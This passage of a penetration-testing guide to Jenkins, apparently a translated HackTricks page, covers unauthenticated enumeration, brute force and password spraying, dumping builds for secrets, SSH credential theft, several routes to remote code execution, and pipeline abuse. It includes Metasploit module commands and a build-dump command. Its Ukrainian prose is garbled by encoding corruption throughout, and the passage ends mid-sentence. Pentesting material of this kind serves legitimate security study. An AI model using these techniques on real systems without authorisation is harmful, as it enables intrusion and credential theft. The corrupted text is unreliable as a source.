# Jenkins Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Jenkins - —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π –ø—Ä–æ–ø–æ–Ω—É—î –ø—Ä–æ—Å—Ç–∏–π —Å–ø–æ—Å—ñ–± —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ **–±–µ–∑–ø–µ—Ä–µ—Ä–≤–Ω–æ—ó —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—ó** –∞–±–æ **–±–µ–∑–ø–µ—Ä–µ—Ä–≤–Ω–æ—ó –¥–æ—Å—Ç–∞–≤–∫–∏** (CI/CD) –¥–ª—è –º–∞–π–∂–µ **–±—É–¥—å-—è–∫–æ—ó** –∫–æ–º–±—ñ–Ω–∞—Ü—ñ—ó **–º–æ–≤ –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è** —Ç–∞ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –≤–∏—Ö—ñ–¥–Ω–æ–≥–æ –∫–æ–¥—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–Ω–≤–µ—î—Ä—ñ–≤. –ö—Ä—ñ–º —Ç–æ–≥–æ, –≤—ñ–Ω –∞–≤—Ç–æ–º–∞—Ç–∏–∑—É—î —Ä—ñ–∑–Ω—ñ —Ä—É—Ç–∏–Ω–Ω—ñ –∑–∞–≤–¥–∞–Ω–Ω—è —Ä–æ–∑—Ä–æ–±–∫–∏. –•–æ—á–∞ Jenkins –Ω–µ —É—Å—É–≤–∞—î **–Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç—ñ–≤ –¥–ª—è –æ–∫—Ä–µ–º–∏—Ö –∫—Ä–æ–∫—ñ–≤**, –≤—ñ–Ω –∑–∞–±–µ–∑–ø–µ—á—É—î —à–≤–∏–¥—à–∏–π —ñ –Ω–∞–¥—ñ–π–Ω—ñ—à–∏–π —Å–ø–æ—Å—ñ–± —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—ó –≤—Å—ñ—î—ó –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ –∑–±—ñ—Ä–∫–∏, —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è —Ç–∞ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è, –Ω—ñ–∂ —Ç–µ, —â–æ –º–æ–∂–Ω–∞ –ª–µ–≥–∫–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –≤—Ä—É—á–Ω—É.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Unauthenticated Enumeration

–©–æ–± —à—É–∫–∞—Ç–∏ —Ü—ñ–∫–∞–≤—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ Jenkins –±–µ–∑ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ (_/people_ –∞–±–æ _/asynchPeople_, —Ü–µ –ø–µ—Ä–µ—Ä–∞—Ö–æ–≤—É—î –ø–æ—Ç–æ—á–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤), –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏ –±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó:
```
msf> use auxiliary/scanner/http/jenkins_command
```
–ë–µ–∑ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–¥–∏–≤–∏—Ç–∏—Å—è –≤ _**/asynchPeople/**_ –∞–±–æ _**/securityRealm/user/admin/search/index?q=**_ –¥–ª—è **—ñ–º–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤**.

–í–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤–µ—Ä—Å—ñ—é Jenkins –∑ —à–ª—è—Ö—É _**/oops**_ –∞–±–æ _**/error**_

![](<../../.gitbook/assets/image (146).png>)

### –í—ñ–¥–æ–º—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## –£–≤—ñ–π—Ç–∏

–£ –±–∞–∑–æ–≤—ñ–π —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ **–≤—Å—ñ —Å–ø–æ—Å–æ–±–∏ –≤—Ö–æ–¥—É –≤ Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### –†–µ—î—Å—Ç—Ä–∞—Ü—ñ—è

–í–∏ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ Jenkins, —è–∫—ñ **–¥–æ–∑–≤–æ–ª—è—é—Ç—å —Å—Ç–≤–æ—Ä–∏—Ç–∏ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —ñ —É–≤—ñ–π—Ç–∏ –≤ –Ω—å–æ–≥–æ. –¢–∞–∫ –ø—Ä–æ—Å—Ç–æ.**

### **SSO –í—Ö—ñ–¥**

–¢–∞–∫–æ–∂, —è–∫—â–æ **—Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å**/**–ø–ª–∞–≥—ñ–Ω–∏** **SSO** –±—É–ª–∏ –ø—Ä–∏—Å—É—Ç–Ω—ñ, —Ç–æ –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **—É–≤—ñ–π—Ç–∏** –≤ –¥–æ–¥–∞—Ç–æ–∫, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–µ—Å—Ç–æ–≤–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å (—Ç–æ–±—Ç–æ, —Ç–µ—Å—Ç–æ–≤–∏–π **Github/Bitbucket –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å**). –¢—Ä—é–∫ –∑ [**—Ç—É—Ç**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### –ë—Ä—É—Ç—Ñ–æ—Ä—Å

**Jenkins** –Ω–µ –º–∞—î **–ø–æ–ª—ñ—Ç–∏–∫–∏ –ø–∞—Ä–æ–ª—ñ–≤** —Ç–∞ **–∑–∞—Ö–∏—Å—Ç—É –≤—ñ–¥ –±—Ä—É—Ç—Ñ–æ—Ä—Å—É —ñ–º–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤**. –í–∞–∂–ª–∏–≤–æ **–±—Ä—É—Ç—Ñ–æ—Ä—Å–∏—Ç–∏** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –æ—Å–∫—ñ–ª—å–∫–∏ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è **—Å–ª–∞–±–∫—ñ –ø–∞—Ä–æ–ª—ñ** –∞–±–æ **—ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —è–∫ –ø–∞—Ä–æ–ª—ñ**, –Ω–∞–≤—ñ—Ç—å **–ø–µ—Ä–µ–≤–µ—Ä–Ω—É—Ç—ñ —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —è–∫ –ø–∞—Ä–æ–ª—ñ**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [—Ü–µ–π python —Å–∫—Ä–∏–ø—Ç](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) –∞–±–æ [—Ü–µ–π powershell —Å–∫—Ä–∏–ø—Ç](https://github.com/chryzsh/JenkinsPasswordSpray).

### IP Whitelisting Bypass

–ë–∞–≥–∞—Ç–æ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ–π –ø–æ—î–¥–Ω—É—é—Ç—å **SaaS-based source control management (SCM) systems** —Ç–∞–∫—ñ —è–∫ GitHub –∞–±–æ GitLab –∑ **–≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–º, —Å–∞–º–æ—Å—Ç—ñ–π–Ω–æ —Ä–æ–∑–≥–æ—Ä–Ω—É—Ç–∏–º CI** —Ä—ñ—à–µ–Ω–Ω—è–º, —Ç–∞–∫–∏–º —è–∫ Jenkins –∞–±–æ TeamCity. –¶–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –¥–æ–∑–≤–æ–ª—è—î CI —Å–∏—Å—Ç–µ–º–∞–º **–æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ webhook –ø–æ–¥—ñ—ó –≤—ñ–¥ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫—ñ–≤ SaaS source control**, –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –¥–ª—è –∑–∞–ø—É—Å–∫—É pipeline jobs.

–©–æ–± –¥–æ—Å—è–≥—Ç–∏ —Ü—å–æ–≥–æ, –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó **–¥–æ–¥–∞—é—Ç—å –¥–æ –±—ñ–ª–æ–≥–æ —Å–ø–∏—Å–∫—É** **IP-–¥—ñ–∞–ø–∞–∑–æ–Ω–∏** **SCM –ø–ª–∞—Ç—Ñ–æ—Ä–º**, –¥–æ–∑–≤–æ–ª—è—é—á–∏ —ó–º –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó CI —Å–∏—Å—Ç–µ–º–∏** —á–µ—Ä–µ–∑ **webhooks**. –û–¥–Ω–∞–∫ –≤–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ **–±—É–¥—å-—Ö—Ç–æ** –º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **–∞–∫–∞—É–Ω—Ç** –Ω–∞ GitHub –∞–±–æ GitLab —ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è **—Ç—Ä–∏–≥–µ—Ä–∞ webhook**, –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ –∑–∞–ø–∏—Ç–∏ –¥–æ **–≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó CI —Å–∏—Å—Ç–µ–º–∏**.

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ: [https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/](https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale//)

## Internal Jenkins Abuses

–£ —Ü–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö –º–∏ –±—É–¥–µ–º–æ –ø—Ä–∏–ø—É—Å–∫–∞—Ç–∏, —â–æ —É –≤–∞—Å —î –¥—ñ–π—Å–Ω–∏–π –∞–∫–∞—É–Ω—Ç –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ Jenkins.

{% hint style="warning" %}
–ó–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ **Authorization** –º–µ—Ö–∞–Ω—ñ–∑–º—É, –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ–≥–æ –≤ Jenkins, —ñ –¥–æ–∑–≤–æ–ª—ñ–≤ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –≤–∏ **–º–æ–∂–µ—Ç–µ –∞–±–æ –Ω–µ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –∞—Ç–∞–∫–∏.**
{% endhint %}

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ—Å–Ω–æ–≤–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listing users

–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ –¥–æ—Å—Ç—É–ø –¥–æ Jenkins, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ —ñ–Ω—à–∏—Ö –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑–∞ –∞–¥—Ä–µ—Å–æ—é [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Dumping builds to find cleartext secrets

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [—Ü–µ–π —Å–∫—Ä–∏–ø—Ç](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) –¥–ª—è –≤–∏–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∫–æ–Ω—Å–æ–ª–µ–π –∑–±—ñ—Ä–æ–∫ —Ç–∞ –∑–º—ñ–Ω–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –∑–±—ñ—Ä–æ–∫, —â–æ–± —Å–ø–æ–¥—ñ–≤–∞—Ç–∏—Å—è –∑–Ω–∞–π—Ç–∏ —Å–µ–∫—Ä–µ—Ç–∏ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **–í–∏–∫—Ä–∞–¥–µ–Ω–Ω—è SSH –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö**

–Ø–∫—â–æ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–∞—î **–¥–æ—Å—Ç–∞—Ç–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è/–º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –Ω–æ–≤–æ–≥–æ Jenkins –≤—É–∑–ª–∞** —ñ SSH –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –≤–∂–µ –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ —ñ–Ω—à–∏—Ö –≤—É–∑–ª—ñ–≤, –≤—ñ–Ω –º–æ–∂–µ **–≤–∏–∫—Ä–∞—Å—Ç–∏ —Ü—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**, —Å—Ç–≤–æ—Ä–∏–≤—à–∏/–º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞–≤—à–∏ –≤—É–∑–æ–ª —ñ **–≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ —Ö–æ—Å—Ç, —è–∫–∏–π –±—É–¥–µ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ** –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∫–ª—é—á–∞ —Ö–æ—Å—Ç–∞:

![](<../../.gitbook/assets/image (218).png>)

–í–∏ –∑–∞–∑–≤–∏—á–∞–π –∑–Ω–∞–π–¥–µ—Ç–µ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ Jenkins ssh —É **–≥–ª–æ–±–∞–ª—å–Ω–æ–º—É –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫—É** (`/credentials/`), —Ç–æ–º—É –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —ó—Ö —Å–∫–∏–Ω—É—Ç–∏ —Ç–∞–∫, —è–∫ –≤–∏ —Å–∫–∏–Ω—É–ª–∏ –± –±—É–¥—å-—è–∫—É —ñ–Ω—à—É —Ç–∞—î–º–Ω–∏—Ü—é. –ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ [**–†–æ–∑–¥—ñ–ª—ñ —Å–∫–∏–¥–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤**](./#dumping-secrets).

### **RCE –≤ Jenkins**

–û—Ç—Ä–∏–º–∞–Ω–Ω—è **shell –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ Jenkins** –¥–∞—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫—Ä–∏—Ç–∏ –≤—Å—ñ **—Å–µ–∫—Ä–µ—Ç–∏** —Ç–∞ **–∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞** —ñ **–µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —ñ–Ω—à—ñ –º–∞—à–∏–Ω–∏**, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω—ñ –≤ —Ç—ñ–π –∂–µ –º–µ—Ä–µ–∂—ñ, –∞–±–æ –Ω–∞–≤—ñ—Ç—å **–∑–±–∏—Ä–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Ö–º–∞—Ä–∏**.

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º Jenkins –±—É–¥–µ **–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ —è–∫ SYSTEM**. –û—Ç–∂–µ, –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—è –π–æ–≥–æ –Ω–∞–¥–∞—Å—Ç—å –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É **–ø—Ä–∏–≤—ñ–ª–µ—ó SYSTEM**.

### **RCE –°—Ç–≤–æ—Ä–µ–Ω–Ω—è/–ú–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –ø—Ä–æ–µ–∫—Ç—É**

–°—Ç–≤–æ—Ä–µ–Ω–Ω—è/–º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –ø—Ä–æ–µ–∫—Ç—É —î —Å–ø–æ—Å–æ–±–æ–º –æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ Jenkins:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE –í–∏–∫–æ–Ω–∞–Ω–Ω—è Groovy —Å–∫—Ä–∏–ø—Ç—É**

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE, –≤–∏–∫–æ–Ω—É—é—á–∏ Groovy —Å–∫—Ä–∏–ø—Ç, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ –±—ñ–ª—å—à –Ω–µ–ø–æ–º—ñ—Ç–Ω–∏–º, –Ω—ñ–∂ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –ø—Ä–æ–µ–∫—Ç—É:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE –°—Ç–≤–æ—Ä–µ–Ω–Ω—è/–ú–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è Pipeline

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ **RCE, —Å—Ç–≤–æ—Ä—é—é—á–∏/–º–æ–¥–∏—Ñ—ñ–∫—É—é—á–∏ pipeline**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è Pipeline

–©–æ–± –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ pipeline, –≤–∞–º –≤—Å–µ —â–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ Jenkins.

### –ë—É–¥—ñ–≤–µ–ª—å–Ω—ñ Pipeline

**Pipeline** —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è —è–∫ **–º–µ—Ö–∞–Ω—ñ–∑–º –∑–±—ñ—Ä–∫–∏ –≤ –ø—Ä–æ–µ–∫—Ç–∞—Ö**, —É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–æ–∂–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ **—Ñ–∞–π–ª –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é**, —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç–∏–º–µ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å pipeline. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è `/Jenkinsfile`:

![](<../../.gitbook/assets/image (127).png>)

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ **–∑–±–µ—Ä—ñ–≥–∞—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏ pipeline –≤ —ñ–Ω—à–∏—Ö –º—ñ—Å—Ü—è—Ö** (–≤ —ñ–Ω—à–∏—Ö —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—è—Ö, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥) –∑ –º–µ—Ç–æ—é **—Ä–æ–∑–¥—ñ–ª–µ–Ω–Ω—è** –¥–æ—Å—Ç—É–ø—É –¥–æ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é —Ç–∞ –¥–æ—Å—Ç—É–ø—É –¥–æ pipeline.

–Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–∞—î **–¥–æ—Å—Ç—É–ø –Ω–∞ –∑–∞–ø–∏—Å –¥–æ —Ü—å–æ–≥–æ —Ñ–∞–π–ª—É**, –≤—ñ–Ω –∑–º–æ–∂–µ **–º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏** –π–æ–≥–æ —ñ **–ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç–∏** pipeline, –Ω–∞–≤—ñ—Ç—å –Ω–µ –º–∞—é—á–∏ –¥–æ—Å—Ç—É–ø—É –¥–æ Jenkins.\
–ú–æ–∂–ª–∏–≤–æ, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ **–æ–±—ñ–π—Ç–∏ –¥–µ—è–∫—ñ –∑–∞—Ö–∏—Å—Ç–∏ –≥—ñ–ª–æ–∫** (–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏ —Ç–∞ –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —ó—Ö –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏ –∞–±–æ –Ω—ñ).

–ù–∞–π–±—ñ–ª—å—à –ø–æ—à–∏—Ä–µ–Ω—ñ —Ç—Ä–∏–≥–µ—Ä–∏ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–æ–≥–æ pipeline:

* **–ó–∞–ø–∏—Ç –Ω–∞ –∑–ª–∏—Ç—Ç—è** –¥–æ –æ—Å–Ω–æ–≤–Ω–æ—ó –≥—ñ–ª–∫–∏ (–∞–±–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –¥–æ —ñ–Ω—à–∏—Ö –≥—ñ–ª–æ–∫)
* **–ü—É—à –¥–æ –æ—Å–Ω–æ–≤–Ω–æ—ó –≥—ñ–ª–∫–∏** (–∞–±–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –¥–æ —ñ–Ω—à–∏—Ö –≥—ñ–ª–æ–∫)
* **–û–Ω–æ–≤–ª–µ–Ω–Ω—è –æ—Å–Ω–æ–≤–Ω–æ—ó –≥—ñ–ª–∫–∏** —ñ –æ—á—ñ–∫—É–≤–∞–Ω–Ω—è, –ø–æ–∫–∏ –≤–æ–Ω–∞ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–∞ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º

{% hint style="info" %}
–Ø–∫—â–æ –≤–∏ —î **–∑–æ–≤–Ω—ñ—à–Ω—ñ–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º**, –≤–∞–º –Ω–µ —Å–ª—ñ–¥ –æ—á—ñ–∫—É–≤–∞—Ç–∏, —â–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **PR –¥–æ –æ—Å–Ω–æ–≤–Ω–æ—ó –≥—ñ–ª–∫–∏** —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é **—ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞/–æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó** —ñ **–∑–∞–ø—É—Å—Ç–∏—Ç–∏ pipeline**... –∞–ª–µ —è–∫—â–æ –≤—ñ–Ω **–ø–æ–≥–∞–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π**, –≤–∏ –º–æ–≥–ª–∏ –± –ø–æ–≤–Ω—ñ—Å—Ç—é **—Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –∫–æ–º–ø–∞–Ω—ñ—ó, –ø—Ä–æ—Å—Ç–æ –µ–∫—Å–ø–ª—É–∞—Ç—É—é—á–∏ 